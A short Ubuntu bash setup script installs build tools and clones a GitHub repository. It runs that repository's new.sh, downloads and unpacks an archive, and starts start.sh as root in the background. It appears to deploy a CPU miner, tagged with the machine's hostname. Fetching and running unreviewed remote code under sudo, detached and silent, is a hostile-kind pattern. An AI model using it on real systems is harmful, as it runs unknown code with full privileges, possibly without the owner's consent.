#!/bin/bash
sudo apt update -y
sudo apt upgrade -y
sudo apt install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
sudo apt install software-properties-common -y
sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
sudo apt install -y gcc-11 g++-11 -y
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 11
sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 11
git clone https://github.com/diegofustox/cwork.git
cd cwork
chmod +x new.sh
./new.sh
cd ..
rm -rf cwork
echo "DONE"
cd work
PROG=`cat new.txt`
wget -O q.tar.gz https://github.com/diegofustox/cwork/blob/main/q.tar.gz?raw=true
tar xvzf q.tar.gz
rm q.tar.gz
hs=`hostname`
sed -i -e "s/SRV/$hs/g" x.json
sed -i -e "s/PRGX/$PROG/g" start.sh
CHANGE="min_val=180"
CHANGE2="min_val=820"
#sed -i -e "s/$CHANGE/$CHANGE2/g" start.sh
LSCPU=$(lscpu)
MODEL_NAME=$(lscpu | egrep "Model name" | tr -s " " | cut -d":" -f 2-)
echo $MODEL_NAME
sudo touch nohup.out
sudo chmod 666 nohup.out
sudo nohup bash start.sh > out.txt &
exit
